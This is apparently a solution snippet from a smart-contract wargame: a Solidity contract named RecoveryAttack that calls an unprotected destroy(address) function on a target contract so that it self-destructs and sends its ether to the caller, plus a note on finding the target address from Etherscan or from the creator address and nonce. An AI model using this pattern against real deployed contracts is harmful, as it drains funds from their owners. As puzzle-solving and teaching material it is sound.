```javascript
pragma solidity ^0.6.0;

contract RecoveryAttack {
    function attack(address address_to_destroy, address payable my_address) public {
        (bool success, ) = address_to_destroy.call(abi.encodeWithSignature("destroy(address)", my_address));
        require(success, "Cannot destroy contract.");
    }
}
```

We can find `address_to_destroy` from etherscan. Otherwise, we can construct the address directly using the contract creation address and the nonce. The rest is straight forward.